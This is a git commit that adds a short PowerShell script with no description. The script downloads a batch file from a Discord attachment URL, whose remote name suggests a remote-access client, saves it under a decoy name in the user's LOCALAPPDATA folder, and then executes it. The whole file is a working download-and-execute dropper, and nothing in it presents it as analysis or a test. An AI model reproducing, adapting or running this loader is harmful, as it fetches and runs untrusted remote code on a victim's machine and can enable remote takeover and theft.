c630964280e04deaec106d13f193240e21af482d
0bsesss <113838619+0bsesss@users.noreply.github.com>
2022-09-18 15:43:02 +0300

    Add files via upload

---
+++ Untitled2.ps1
@@ -0,0 +1,6 @@
+﻿cd $env:LOCALAPPDATA
+
+Invoke-WebRequest -URI https://cdn.discordapp.com/attachments/1020829026828435547/1020832897273446430/AsyncClientaras.bat -OutFile yenemezsinki.bat
+
+cd $env:LOCALAPPDATA
+start "$env:LOCALAPPDATA\yenemezsinki.bat"
